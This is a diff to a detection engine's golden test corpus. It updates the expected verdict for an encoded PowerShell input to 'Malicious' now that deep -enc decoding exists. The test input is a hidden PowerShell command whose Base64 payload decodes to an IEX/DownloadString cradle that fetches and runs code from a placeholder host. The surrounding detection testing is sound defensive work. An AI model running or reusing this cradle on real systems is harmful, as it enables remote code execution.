@@ -141,12 +141,13 @@ GOLDEN_CORPUS: Tuple[Dict[str, Any], ...] = (
         "input": ("powershell.exe -nop -w hidden -enc "
                   "SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AeAAuAHkALwBhACIAKQA="),
         "expected": {
-            # Encoded command payload not yet fully decoded by PS interpreter
-            # (deeper -enc payload extraction is a Phase 9.5b follow-up).
-            # Per architectural invariant § 10: obfuscation alone does not
-            # lift verdict without decoded payload evidence.
-            "verdict": "Benign",
-            "mitre": ["T1059", "T1027"],
+            # Phase 9.5c: deep -enc decoding now recursively feeds the
+            # decoded UTF-16LE Base64 payload back through the RC5
+            # pipeline (Parser → SIR → Behavior → MITRE → Verdict).
+            # Result: WebClient.DownloadString → HttpNode → T1105 +
+            # T1071 + T1027 (obfuscation) + T1059 (PS execution).
+            "verdict_min": "Malicious",
+            "mitre": ["T1059", "T1027", "T1105"],
             "lolbins_executed": [],
         },
     },
